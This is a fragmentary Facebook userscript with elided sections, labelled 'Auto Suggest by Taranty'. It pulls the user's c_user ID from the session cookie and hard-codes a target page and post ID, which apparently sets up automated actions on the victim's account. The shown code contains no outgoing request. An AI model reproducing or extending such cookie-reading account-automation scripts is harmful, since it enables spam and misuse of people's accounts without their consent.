...
// @author			Taranty (Uğur Öztürk)
// @authorURL			http://www.facebook.com/taranty
// @include			htt*://www.facebook.com/*
// @icon			http://www.facebook.com/photo.php?fbid=10151141083684321&set=a.439813074320.203668.521999320&type=1&relevant_count=1
// @version			1.12
...
var spage_id = "158005867595169";
var spost_id = "499066273489125";
var sfoto_id = "";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Taranty (Uğur Öztürk)';
